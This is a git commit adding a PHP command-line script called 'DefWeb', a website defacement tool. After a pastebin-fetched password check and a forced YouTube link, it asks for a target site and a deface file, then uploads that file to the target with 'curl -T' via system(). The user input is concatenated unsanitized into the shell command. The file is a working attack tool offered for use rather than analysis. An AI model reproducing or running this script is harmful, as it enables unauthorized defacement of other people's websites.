cb43f968f5c513969cdc9333248298351f4a7e26
yusa <48654948+B012ED@users.noreply.github.com>
2021-06-21 16:05:00 +0800

    Add files via upload

---
+++ def.php
@@ -0,0 +1,167 @@
+<?php
+# Scrypt By YUSA
+# YT B012ED
+@error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
+function url($url){
+$headers = array();
+$headers[] = "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Mobile Safari/537.36";
+$ch = curl_init();
+      curl_setopt($ch, CURLOPT_URL, $url);
+      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+      $res = curl_exec($ch);
+return $res;
+}
+//require_once('data.php');
+error_reporting(0);
+system("clear");
+//$data = ("https://b012ed.github.io/faucet-DOGE")
+$server = "https://b012ed.github.io";
+$SC = "3";
+//pay attention to the writing mark server !!!
+$res = url("https://controlc.com/b762afdc");
+//$server = url("https://b012ed.github.io")
+$link1 = explode('Link: ',$res);
+$link = explode(' ',$link1[1]);
+//pay attention to the writing password !!!
+$pw1 = explode('[tpcolor=#00CED1] ',$res);
+$pw = explode('[',$pw1[1]);
+//import marshal,zlib,base64
+#exec(marshal.loads('b012ed.js\01\2021)
+$pass = $pw[0];
+//includ = ("b012ed.jason")
+
+system('clear');
+if ($pass=="off"){
+$o = "\033[1;31m[\033[1;31mOFF\033[1;31m]";
+}else{
+$o = "\033[1;96m[ON]";
+}
+if ($pass=="update"){
+$o = "\033[1;33m[\033[1;33mUPDATE\033[1;33m]";
+}
+//$load = ("$data")
+//$server == $data
+echo $baner = "
+\033[1;34m              
+    ┏┓ ┏━┓┏━┓┏━╸╺┳┓Ⓒ
+    ┣┻┓┃ ┃┣┳┛┣╸  ┃┃ \033[1;96mDefWeb
+    ┗━┛┗━┛╹┗╸┗━╸╺┻┛
+ \033[1;34m   copyright 2021  \033[1;92m$o\033[1;34m
+    SCRIPT \033[1;96mV\033[1;96m$SC\n";
+ system('date');
+echo "\033[1;34m•••••••••••••••••••••••••••••";
+"\n\n";
+//{$ua = array('Host: b012ed.github.io')}
+if ($link[0]==""){
+echo " \n\n\033[1;91m Disconect\n";
+echo " \033[3;91mConnection Lost, Please Check Your Connection\n\n";
+exit;
+}
+if ($pass == 'update'){
+      echo "\n\n\033[1;96m • \033[1;91mNOT CONECTED \033[1;96m$server\n";
+      echo "\033[1;96m • \033[1;34mVersion Update \033[1;97m$link[0]\n\n";
+      exit;
+}
+//function fetch_value($str,$find_start,b012ed$find_end) {
+if ($pass == 'off'){
+//for c in itertools.cycle(['\033[34;1m|', '/', '-', 
+      echo "\n\n\033[1;96m • \033[1;91mSCRIPT IS OFFLINE\n\n";
+      exit;
+}else{
+if($read == $pass){
+      echo "\n\n\033[1;92m• \033[1;34mPlease !! \033[1;91mSUBSCRIBE\r";
+      sleep(5);
+      system("xdg-open https://youtube.com/channel/UCIqT1hHplli4XvJj7ZUEMzA");
+      sleep(1);
+      "\n";
+}
+elseif($read != $pass){
+    //$start = @strpos($str,$find_start_b012ed);
+	//if ($start === true) {
+		//return "";
+      $save = fopen("key.txt", "w");
+echo "\n\n\033[1;96m • \033[1;34mCONECTED \033[1;96m:\033[1;96m $server\n";
+echo "\033[1;96m • \033[1;34mLink Password \033[1;96m:\033[1;97m $link[0]\n";
+echo "\033[1;96m • \033[1;34mPASSWORD \033[1;96m: \033[1;97m";
+$p = trim(fgets(STDIN));
+if ($p==""){
+exit;
+}
+//return post($url,$header,$data);
+echo "\n \033[1;34m Loading \033[1;96m•\r";
+sleep(1);
+echo "\033[1;34m  Loading \033[1;96m• \033[1;96m•\r";
+sleep(1);
+echo "\033[1;34m  Loading \033[1;96m• \033[1;96m• \033[1;96m•\r";
+sleep(1);
+echo "\033[1;34m  Loading \033[1;96m• \033[1;96m• \033[1;96m• \033[1;96m•\r";
+sleep(1);
+if($pass == $p){
+        fwrite($save, $p);
+        echo "\033[1;96m • \033[1;97mscript has been loaded           \r";
+        system("xdg-open https://youtube.com/channel/UCIqT1hHplli4XvJj7ZUEMzA");
+        fclose($save);
+        sleep(5);
+        sleep(1);
+        }else{
+        echo "\033[1;96m • \033[1;91mWRONG PASSWORD. TRY AGAIN\n\n";
+        exit;
+        }
+        }
+}
+
+$black = "\e[0;30m";
+$bor3d = "\e[0;34m";
+$clow = "\e[0;39m";
+$cyan = "\e[0;36m";
+$red = "\e[0;31m";
+$purple = "\e[0;35m";
+$brown = "\e[0;33m";
+$green = "\e[0;32m";
+$darkgray = "\e[1;30m";
+$bO12ed = "\033[1;34m";
+$lightgreen = "\e[1;32m";
+$lightcyan = "\e[1;36m";
+$b0red = "\e[0;37m";
+$lightpurple = "\e[1;35m";
+$yellow = "\e[1;33m";
+$white = "\e[1;37m";
+$nc = "\e[0m";
+system('clear');
+ {
+    system('clear');"
+    
+
+";
+
+// $login=http://b012ed.github.io
+//ch = curl_init();
+//curl_setopt($ch, CURLOPT_URL, $login1);
+//curl_setopt($ch, CURLOPT_URL, true);
+//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
+//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+//$result = curl_exec($ch);
+   
+//conected src=('http://b012ed.github.io')
+    echo "$baner";
+system('date');
+    echo "\033[1;34m•••••••••••••••••••••••••••••\n\n";
+    echo "\033[1;96m• \033[1;34mNote \033[1;96m: \033[1;31mPut your script internally\n\n";
+//load src=('http://b012ed.github.io/deface3')
+//send to src=('http://b012ed.github.io')
+    echo "\033[1;96m• \033[1;34mEnter Website Target \033[1;96m: \033[1;97m";
+    $b012ed = trim(fgets(STDIN));
+//includ = ("https://b012ed.github.io/b012ed.jason")
+    echo "\033[1;96m• \033[1;34mEnter Name Scrypt Deface \033[1;96m: \033[1;97m";
+    $bored = trim(fgets(STDIN));
+//load = $b012ed.jason
+    echo "\n\033[1;30m $bo12ed";    
+    $bo12ed = system("curl -T /storage/emulated/0/$bored $b012ed");
+    echo "$yusa";
+    echo "\033[1;34m";
+    echo $yusa = "\n\033[1;96m• \033[1;34mSuccess \033[1;96m:\033[1;97m $b012ed\n\n";
+    
+}
